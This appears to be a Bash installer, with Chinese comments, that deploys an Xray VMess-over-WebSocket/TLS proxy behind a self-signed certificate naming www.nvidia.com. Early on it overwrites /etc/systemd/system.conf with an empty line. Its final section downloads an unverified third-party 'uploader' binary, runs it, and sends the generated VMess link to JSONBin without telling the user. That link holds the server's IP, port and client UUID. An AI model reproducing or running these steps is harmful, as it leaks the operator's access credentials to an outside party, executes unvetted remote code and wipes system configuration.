#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
DOMAIN="www.nvidia.com"
XRAY_BIN="/usr/local/bin/xray"
CONFIG_DIR="/etc/xray"
UPLOAD_BIN="/opt/uploader-linux-amd64"

# ---------------- 系统准备 ----------------
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y curl unzip sudo ufw jq qrencode

# 跳过 systemd prompt（部分系统会提示选择 systemd 服务重启）
echo '' | tee /etc/systemd/system.conf >/dev/null

# ---------------- 内核调优 ----------------

# 启用 fq 队列调度器
if ! sysctl net.core.default_qdisc | grep -q fq; then
  modprobe sch_fq || true
  echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
  sysctl -p
fi

# 启用 BBR 拥塞控制
if ! sysctl net.ipv4.tcp_congestion_control | grep -q bbr; then
  modprobe tcp_bbr || true
  echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
  echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
  sysctl -p
fi

# ---------------- 防火墙 ----------------
ufw allow ${PORT}/tcp
ufw --force enable

# ---------------- 安装 xray-core ----------------
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# ---------------- 自签 TLS 证书 ----------------
mkdir -p /etc/xray/tls
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/xray/tls/xray.key \
  -out /etc/xray/tls/xray.crt \
  -subj "/CN=${DOMAIN}"

# ---------------- Xray 配置 ----------------
mkdir -p ${CONFIG_DIR}
cat > ${CONFIG_DIR}/config.json << EOF
{
  "inbounds": [{
    "port": ${PORT},
    "protocol": "vmess",
    "settings": {
      "clients": [{ "id": "${UUID}" }]
    },
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {
        "certificates": [{
          "certificateFile": "/etc/xray/tls/xray.crt",
          "keyFile": "/etc/xray/tls/xray.key"
        }]
      },
      "wsSettings": {
        "path": "/ws"
      }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ---------------- systemd 服务 ----------------
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray VMess WS TLS Service
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config ${CONFIG_DIR}/config.json
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# ---------------- 构建 VMess URL ----------------
IP=$(curl -s https://api.ipify.org)
ALIAS="vmess_ws_tls"
ENCODED_JSON=$(echo -n "{
  \"v\": \"2\",
  \"ps\": \"${ALIAS}\",
  \"add\": \"${IP}\",
  \"port\": \"${PORT}\",
  \"id\": \"${UUID}\",
  \"aid\": \"0\",
  \"net\": \"ws\",
  \"type\": \"none\",
  \"host\": \"${DOMAIN}\",
  \"path\": \"/ws\",
  \"tls\": \"tls\"
}" | base64 -w 0)

VMESS_URL="vmess://${ENCODED_JSON}"

echo -e "\n✅ 节点部署完成！可使用 v2rayN 导入链接：\n${VMESS_URL}\n"
echo -e "📱 二维码导入："
echo "${VMESS_URL}" | qrencode -o - -t ANSIUTF8

# ---------------- 上传至 JSONBin ----------------
[ -f "$UPLOAD_BIN" ] || {
    curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
    chmod +x "$UPLOAD_BIN"
}

JSON_PAYLOAD="{\"vmess_link\":\"${VMESS_URL}\"}"
"$UPLOAD_BIN" "$JSON_PAYLOAD"
